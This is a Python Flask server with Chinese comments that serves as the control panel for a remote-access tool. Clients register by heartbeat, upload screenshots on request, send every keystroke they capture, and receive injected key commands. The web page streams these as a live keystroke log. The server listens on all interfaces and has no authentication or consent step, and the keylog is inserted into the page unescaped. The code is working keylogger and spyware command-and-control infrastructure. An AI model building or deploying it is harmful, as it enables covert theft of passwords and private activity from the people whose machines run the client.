from flask import Flask, request, jsonify, render_template_string
import time
import threading
import logging
import os
from PIL import Image
from datetime import datetime
import io

# 关闭垃圾日志
logging.getLogger('werkzeug').setLevel(logging.ERROR)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.FileHandler("server.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.info

app = Flask(__name__)

CLIENTS = {}
KEY_LOGS = []
LOCK = threading.Lock()
TIMEOUT = 1.0
SAVE_DIR = "client_screens"
os.makedirs(SAVE_DIR, exist_ok=True)

# 超时检测
def check_timeout():
    while True:
        now = time.time()
        with LOCK:
            offline = [cid for cid, v in CLIENTS.items() if now - v["last_hb"] > TIMEOUT]
            for cid in offline:
                logger(f"客户端 {cid} 已断开")
                del CLIENTS[cid]
        time.sleep(0.5)

# 心跳
@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    cid = request.json["client_id"]
    now = time.time()
    with LOCK:
        if cid not in CLIENTS:
            logger(f"客户端 {cid} 已上线")
            os.makedirs(f"{SAVE_DIR}/{cid}", exist_ok=True)
            CLIENTS[cid] = {"last_hb": now, "screen": None, "cmds": [], "need_screen": False}
        CLIENTS[cid]["last_hb"] = now
    return jsonify(status="ok")

# 客户端询问是否需要传图
@app.route("/need_screen", methods=["POST"])
def need_screen():
    cid = request.json["client_id"]
    with LOCK:
        need = CLIENTS.get(cid, {}).get("need_screen", False)
        if need:
            CLIENTS[cid]["need_screen"] = False
    return jsonify(need=need)

# 接收屏幕
@app.route("/upload/screen", methods=["POST"])
def upload_screen():
    cid = request.form.get("client_id")
    if cid not in CLIENTS:
        return jsonify(status="ok")
    
    img = Image.open(io.BytesIO(request.files["screen"].read()))
    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
    img.save(f"{SAVE_DIR}/{cid}/{ts}.jpg", "JPEG", quality=40)
    
    with LOCK:
        CLIENTS[cid]["screen"] = img
    return jsonify(status="ok")

# 获取指令
@app.route("/get_cmds", methods=["POST"])
def get_cmds():
    cid = request.json.get("client_id", "")
    with LOCK:
        if cid not in CLIENTS:
            return jsonify(cmds=[])
        cmds = CLIENTS[cid]["cmds"].copy()
        CLIENTS[cid]["cmds"].clear()
    return jsonify(cmds=cmds)

# 上传按键 → 同时存入网页日志
@app.route("/upload/key", methods=["POST"])
def upload_key():
    d = request.json
    cid = d.get("client_id", "unknown")
    key = d.get("key", "")
    t = datetime.now().strftime("%H:%M:%S")
    
    with LOCK:
        KEY_LOGS.append(f"[{t}] {cid} → {key}")
        if len(KEY_LOGS) > 50:
            KEY_LOGS.pop(0)
    
    logger(f"[{cid}] 输入: {key}")
    return jsonify(status="ok")

# 网页控制端
@app.route("/")
def index():
    html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>远程控制中心</title>
    <style>
        body{font-family: Arial; padding: 20px; background:#1a1a1a; color:white;}
        .box{border:1px solid #444; padding:10px; margin:10px 0; border-radius:8px; background:#2a2a2a;}
        button{padding:8px 16px; margin:5px; cursor:pointer; background:#0077ff; color:white; border:none; border-radius:5px;}
        input{padding:6px; width:100px;}
        #screen{max-width:600px; border:1px solid #666; margin-top:10px; display:none;}
        #keyLogs{height:150px; overflow-y:auto; background:#111; padding:8px; border:1px solid #444; border-radius:5px;}
    </style>
</head>
<body>
    <h2>远程控制中心</h2>

    <div class="box">
        <h3>在线客户端</h3>
        <div id="client_list"></div>
        <button onclick="refreshClients()">刷新客户端列表</button>
    </div>

    <div class="box">
        <h3>实时按键记录</h3>
        <div id="keyLogs"></div>
    </div>

    <div class="box">
        <h3>屏幕画面</h3>
        <button onclick="refreshScreen()">刷新屏幕</button>
        <img id="screen" src="">
    </div>

    <div class="box">
        <h3>远程按键</h3>
        <input id="key" value="enter" placeholder="按键">
        <button onclick="sendKey()">发送</button>
    </div>

<script>
let selectedClient = "";

function refreshClients() {
    fetch("/api/clients").then(res=>res.json()).then(data=>{
        let list = document.getElementById("client_list");
        list.innerHTML = "";
        data.forEach(cid=>{
            let btn = document.createElement("button");
            btn.innerText = cid;
            btn.onclick = ()=>{ selectedClient = cid; alert("选中: "+cid); };
            list.appendChild(btn);
        });
    });
}

function refreshScreen() {
    if(!selectedClient) { alert("请先选择客户端"); return; }
    fetch("/api/refresh_screen?cid="+selectedClient).then(()=>{
        setTimeout(()=>{
            let img = document.getElementById("screen");
            img.src = "/screen/"+selectedClient+"?t="+new Date().getTime();
            img.style.display = "block";
        }, 300);
    });
}

function sendKey() {
    if(!selectedClient) { alert("请先选择客户端"); return; }
    let key = document.getElementById("key").value;
    fetch("/api/send_key", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({cid:selectedClient, key:key})
    });
}

function loadKeyLogs() {
    fetch("/api/key_logs").then(res=>res.json()).then(data=>{
        let dom = document.getElementById("keyLogs");
        dom.innerHTML = data.join("<br>");
        dom.scrollTop = dom.scrollHeight;
    });
}

setInterval(refreshClients, 2000);
setInterval(loadKeyLogs, 500);
</script>
</body>
</html>
    """
    return render_template_string(html)

@app.route("/api/clients")
def api_clients():
    with LOCK:
        return jsonify(list(CLIENTS.keys()))

@app.route("/api/refresh_screen")
def api_refresh_screen():
    cid = request.args.get("cid")
    with LOCK:
        if cid in CLIENTS:
            CLIENTS[cid]["need_screen"] = True
    return jsonify(status="ok")

@app.route("/screen/<cid>")
def get_screen(cid):
    from flask import send_file
    img = CLIENTS.get(cid, {}).get("screen", None)
    if not img:
        img = Image.new("RGB", (300, 200), "gray")
    buf = io.BytesIO()
    img.save(buf, "JPEG", quality=40)
    buf.seek(0)
    return send_file(buf, mimetype="image/jpeg")

@app.route("/api/send_key", methods=["POST"])
def api_send_key():
    d = request.json
    cid = d["cid"]
    key = d["key"]
    with LOCK:
        if cid in CLIENTS:
            CLIENTS[cid]["cmds"].append(key)
    return jsonify(status="ok")

@app.route("/api/key_logs")
def api_key_logs():
    with LOCK:
        return jsonify(KEY_LOGS)

if __name__ == "__main__":
    logger("服务启动 → 打开浏览器访问: http://127.0.0.1:5800")
    threading.Thread(target=check_timeout, daemon=True).start()
    app.run(host="0.0.0.0", port=5800, threaded=True)